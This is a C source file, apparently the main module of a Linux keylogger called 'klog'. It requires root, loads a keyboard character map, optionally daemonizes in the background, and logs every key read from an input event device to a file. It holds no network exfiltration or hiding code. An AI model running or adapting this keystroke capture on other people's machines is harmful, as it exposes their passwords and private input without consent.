#include <stdio.h>
#include <unistd.h>
#include <stdarg.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/param.h>


#include "compat.h"
#include "mapper.h"
#include "logger.h"


#define PROGNAME	"klog"
#define VERSION		"1.1-dev"
#define DEFAULT_MAP	"./map/en_US.map"
#define DEFAULT_PIDFILE	"/var/run/klog.pid"

#define F_NODAEMON	(1 << 0)
#define F_NOINSTANCE	(1 << 1)


static int	stoplog = 0;


static void usage(void)
{
	fprintf(stderr, "usage: %s [options] <eventid>\n", PROGNAME);
	fprintf(stderr, "options:\n");
	fprintf(stderr, "\t-h       : display this and exit\n");
	fprintf(stderr, "\t-q       : quiet mode\n");
	fprintf(stderr, "\t-v       : display version number and exit\n");
	fprintf(stderr, "\t-o <log> : write log to <log> (default=stdout)\n");
	fprintf(stderr, "\t-m <map> : load the map character <map> (default=%s)\n", DEFAULT_MAP);
	fprintf(stderr, "\t-f       : keep on foreground (eg: no daemon)\n");
	fprintf(stderr, "\t-p <pid> : write the pid in the <pid> file (default=%s)\n", DEFAULT_PIDFILE);
	fprintf(stderr, "\t-n       : do not check if an instance is already running\n");
}


static void version(void)
{
	fprintf(stderr, "%s version %s\n", PROGNAME, VERSION);
}


static int check_instance(const char *pidfile)
{
	FILE	*f;
	int	pid;

	if ( !pidfile )
		return 0;

	if ( (f = fopen(pidfile, "r")) == NULL )
		return 0;

	if ( !fscanf(f, "%d", &pid) )
		pid = 0;

	fclose(f);

	return pid;
}


static void handle_signal(int sig)
{
	fprintf(stderr, "Received signal %d\n", sig);
	stoplog = 1;
}


static void setup_signals()
{
	struct sigaction	s;

	memset(&s, 0, sizeof s);
	s.sa_handler = handle_signal;
	s.sa_flags = 0;

	sigaction(SIGINT, &s, NULL);
	sigaction(SIGTERM, &s, NULL);
}


static int write_pid_file(const char *file, int pid)
{
	FILE	*f;

	if ( (f = fopen(file, "w")) == NULL )
		return -1;

	fprintf(f, "%d\n", pid);
	fclose(f);

	return 0;
}


static int loop(struct log *log, struct map *map)
{
	struct input_event	ev;
	const char		*key;

	while ( !stoplog )
	{
		if ( logger_get_event(&ev, log) )
			continue;

		if ( (key = mapper_get_key(&ev, map)) == NULL )
			continue;

		logger_save(key, log);
	}

	return 0;
}


int main(int argc, char *argv[])
{
	int		c,
			ret = -1,
			pid;
	const char	*logname = "-";
	const char	*mapname = DEFAULT_MAP;
	const char	*pidfile = DEFAULT_PIDFILE;
	struct map	*map = NULL;
	struct log	*log = NULL;
	unsigned	flags = 0;

	while ( (c = getopt(argc, argv, "hqvo:m:fpn")) != -1 )
	{
		switch ( c )
		{
			case 'h':
			usage();
			return 0;

			case 'q':
			freopen("/dev/null", "w", stderr);
			break;

			case 'v':
			version();
			return 0;

			case 'o':
			logname = optarg;
			break;

			case 'm':
			mapname = optarg;
			break;

			case 'f':
			flags |= F_NODAEMON;
			break;

			case 'p':
			pidfile = optarg;
			break;

			case 'n':
			flags |= F_NOINSTANCE;
			break;

			default:
			fprintf(stderr, "Unknown option %c\n", (char) c);
			goto error;
		}
	}

	argc -= optind, argv += optind;

	if ( argc == 0 )
	{
		usage();
		goto error;
	}

	if ( getuid() != 0 )
	{
		fprintf(stderr, "Are you root ?\n");
		goto error;
	}

	if ( (flags & F_NOINSTANCE) == 0 && (pid = check_instance(pidfile)) )
	{
		fprintf(stderr, "%s is already running on PID %d\n", PROGNAME, pid);
		goto error;
	}

	if ( (map = mapper_load(mapname)) == NULL )
	{
		fprintf(stderr, "Unable to load char map %s\n", mapname);
		goto error;
	}

	setup_signals();

	/* Now, we can daemonize
	 */
	if ( (flags & F_NODAEMON) == 0 )
	{
		int	pid;

		switch ( (pid = fork()) )
		{
			case 0:
			fprintf(stderr, "Fork success\n");
			break;

			case -1:
			perror("Can not fork !");
			goto error;

			default:
			fprintf(stderr, "Child pid %d\n", pid);
			if ( write_pid_file(pidfile, pid) )
				fprintf(stderr, "Unable to write pid in %s\n", pidfile);
			return 0;
		}
	}


	if ( (log = logger_open(logname, argv[0])) == NULL )
		goto error;

	/* Start the main loop
	 */
	if ( loop(log, map) )
		fprintf(stderr, "Something went wrong...");
	else
		ret = 0;

error:
	if ( log != NULL )
		logger_close(log);

	if ( map != NULL )
		mapper_unload(map);

	unlink(pidfile);

	return ret;
}
